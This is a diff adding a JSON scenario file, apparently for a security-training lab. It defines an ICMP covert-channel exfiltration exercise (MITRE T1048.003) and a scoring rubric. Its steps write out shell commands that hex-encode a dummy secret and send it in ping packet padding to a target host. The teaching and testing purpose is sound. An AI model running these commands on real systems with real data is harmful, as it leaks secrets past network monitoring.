@@ -1,0 +1,92 @@
+{
+  "id": "covert_channel_icmp",
+  "name": "ICMP Covert Channel Data Exfiltration",
+  "description": "教学与测试目的：通过 ICMP 协议传输敏感数据（隐蔽信道 Covert Channel 攻击）。将机密信息进行十六进制编码后，作为 ICMP 报文的填充字段（Payload）通过 Ping 发送到目标主机。演示如何利用合法网络流量规避防火墙监测，将数据隐蔽外发，对应 MITRE ATT&CK 渗出（Exfiltration）战术阶段的非标准协议渗出技术（T1048.003）。",
+  "category": "exploitation",
+  "difficulty": "medium",
+  "estimatedDuration": "4 min",
+  "rolesAllowed": [
+    "operator",
+    "admin"
+  ],
+  "mitrePhases": [
+    "Exfiltration"
+  ],
+  "mitreTechniques": [
+    "T1048.003"
+  ],
+  "targetType": [
+    "windows_host",
+    "local_ip",
+    "localhost"
+  ],
+  "steps": [
+    {
+      "id": "step1_encode_secret",
+      "name": "Encode Secret Data",
+      "description": "将敏感数据写入本地并使用 Python 3 将其转换为十六进制格式作为填充数据（Payload）。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "echo 'SecretData123' > /tmp/secret.txt && python3 -c \"print(open('/tmp/secret.txt','rb').read().hex()[:32])\" | tr -d '\\n' > /tmp/icmp_payload.txt && echo \"Payload encoded: $(cat /tmp/icmp_payload.txt)\""
+      ],
+      "score": 30,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1059.006"
+      ]
+    },
+    {
+      "id": "step2_send_icmp_payload",
+      "name": "Send ICMP Covert Payload",
+      "description": "使用 ping 命令的 -p 参数，将十六进制填充数据嵌入 ICMP 数据包中发送给目标主机，实现隐蔽传输。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "PAYLOAD=$(cat /tmp/icmp_payload.txt) && ping -c 4 -p \"$PAYLOAD\" {{host}}"
+      ],
+      "score": 70,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1048.003"
+      ]
+    }
+  ],
+  "rubric": {
+    "items": [
+      {
+        "id": "payload_encoded",
+        "desc": "成功将敏感数据编码为十六进制格式",
+        "points": 30,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "Payload encoded"
+        }
+      },
+      {
+        "id": "icmp_sent",
+        "desc": "成功嵌入 payload 并在 ICMP 报文中向目标发送",
+        "points": 70,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "ping|packets transmitted|pattern"
+        }
+      }
+    ]
+  },
+  "notSuitableFor": [
+    "dvwa",
+    "web_url"
+  ],
+  "baselineGroup": "local-security-check",
+  "expectedOutputPolicy": "expect_output",
+  "emptyOutputExplanation": "隐蔽信道数据外发依赖 ping 命令的 -p 填充参数；需要目标主机能够响应 ping 请求",
+  "applicableTargetType": [
+    "windows_host",
+    "local_ip",
+    "localhost"
+  ],
+  "teachingObjective": "演示和分析使用 ICMP 数据包填充字段隐藏并外发数据的隐蔽信道技术（T1048.003）",
+  "target_class": "linux_host",
+  "disableAutoInsert": true
+}
